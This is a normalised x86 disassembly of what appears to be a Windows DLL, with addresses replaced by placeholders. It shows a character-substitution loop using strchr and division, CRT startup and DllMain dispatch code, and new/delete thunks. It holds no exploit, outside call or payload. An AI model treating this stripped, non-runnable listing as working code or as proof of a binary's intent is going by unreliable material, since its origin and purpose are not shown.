mov [ esi + eax ] 0x0
mov eax esi
pop esi
pop ebp
pop edi
pop ecx
retn
mov ecx [ esp + 0x18 ]
mov eax edx
sub eax ecx
push ebx
mov [ esp + 0x18 ] eax
jmp r-xdata
mov ecx [ esp + 0x1c ]
lea ebx [ esi + ecx ]
movsx edx [ eax + ebx ]
push edx
push rw-data
call [ strchr@IAT ]
mov edi eax
mov eax esi
cdq
idiv [ esp + 0x28 ]
sub edi rw-data
movsx eax [ edx + rw-data ]
push eax
push rw-data
call [ strchr@IAT ]
lea ecx [ edi + ebp + rw-data ]
add esp 0x10
sub ecx eax
mov eax ecx
cdq
idiv ebp
mov eax [ esp + 0x10 ]
inc esi
cmp esi eax
mov dl [ edx + rw-data ]
mov [ ebx ] dl
jl r-xdata
mov eax [ esp + 0x18 ]
pop ebx
sub_1000225c
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_1000225c
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_100018b0
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_1000225c
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_1000225c
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
_initterm
jmp [ _initterm@IAT ]
